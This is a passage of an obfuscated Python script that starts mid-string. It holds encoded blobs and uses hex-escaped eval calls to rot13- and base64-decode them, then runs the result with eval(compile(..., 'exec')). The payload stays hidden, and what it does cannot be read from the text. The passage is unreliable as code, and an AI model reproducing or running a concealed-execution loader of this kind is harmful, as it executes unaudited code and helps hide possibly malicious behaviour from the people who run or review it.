CYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcE'
destiny = 'pdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPbXVvVvXDbWMz9lVTxtnJ4tpzShM2HtXTAlLKAbXGbXPDyjpzyhqPtcPtxWpUWcoaDbMvW7JK1or1q94clGr1y9KFOGMJ5xnJ5aVR5iqlVcPtxWoTyhnmRtCFOipl5mrKA0MJ0boTyhnlxXPDy0nJ1yYaAfMJIjXQHcPtxWnJLtoTyhnmRtCG0tZQbXPDxWpUWcoaDbMvW7E30tH3IwL2Imp2M1oPOGMJ5xVCPsxL0tFJ5mqTRtDTglnKAbK25uKmV1AwtvXDbWPDyjLKAmPtxWMJkmMGbXPDxWpUWcoaDbMvW7E31oj5qqVRMunJkyMPNtVvxXPDy0nJ1yYaAfMJIjXQNhZvxXPKWypltcPzEyMvOgLJyhXPx6PtywnTIwn19coaElXPxXPJ9mYaA5p3EyoFtaL2kyLKVaXDbWpUWcoaDboT9aolxXPKOlnJ50XSxcPtyipl5mrKA0MJ0bMvqxLKD9WPuxLKEyXFNzWvOyL2uiVUgMsFNt4cliVUgKsIAHDIWHEHDtG04tBvO7D30xMTS0WlxXPKOlnJ50XTLvr1q9KT4gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYFVcPtyjpzyhqPuzVagMsrXnbFOHnTymVUEio2jtnKZto25frFOzo3VtEJE1L2S0nJ9hLJjtHUIlpT9mMKZtVFVcPtyjpzyhqPuzVagKsF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gVvxXPKOlnJ50XTLvKT57E31QnT9ip2HtDJ55VR9jqTyioykhVvxXPKEyrUDtCFNbMvVvVagUsIg7I30kr0q9KKgFsFOPLJSjEl1OISEOD0ftr1q9Cw4+KT57E31or1q9ZagUsI17JK0tI0uOISAOHSNtDx9ADxIFr1q9VQ4+Cykhr0q9J3gKsGA7E31qr1y9VRSvo3I0VUgKsG4+Cykhr0q9J3gKsGE7E31qr1y9VRI4nKDtr1q9Cw4+KT4vVvVcPtyjpzyhqPu0MKu0XDbWLFN9VTyhpUI0XTLvr1W9VQ4+CvO7E30vXDbWnJLtLFN9CFNaZFp6PtxWp21mXPxXPJIfnJLtLFN9CFNaZvp6PtxWq3Ovo21vXPxXPJIfnJLtLFN9CFNaZlp6PtxWpUWcoaDbMvW7D31povOOoTjtD3WyMTy0VQbtF3Wcp2uhLFOGnJ5anPOFLJcjqKDtKT4tr0q9D29xMJDtLaxtDJ5mnPORLJE3LJkpoykhr1q9r2kcL31poykhVvxXPDylMKZbXDxXPJIfnJLtLFN9CFNaAPp6PtxWp3ymYzI4nKDbZFxXPJIfp2H6PtxWpzI0qKWhVT1unJ4bXDxXMTIzVUWypltcBtbWpw1coaO1qPuzVagMsHEiVUyiqFO3LJ50VUEiVUWyp3EupaDtJ3xioy0tCFNvXDbWnJLtpvN9CFq5WmbXPDygLJyhXPxXPJIfp2H6PtxWpUWcoaDbnQRcPtxWpUWcoaDbMvWTo2kfo3pto24tFJptBvO7I31Nn3Wcp2usozSsZwH2BPVcPtxWMKucqPtcPaOlnJ50XSA0rJkyYxWFFHqVIPxWPDcgLJyhXPx='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
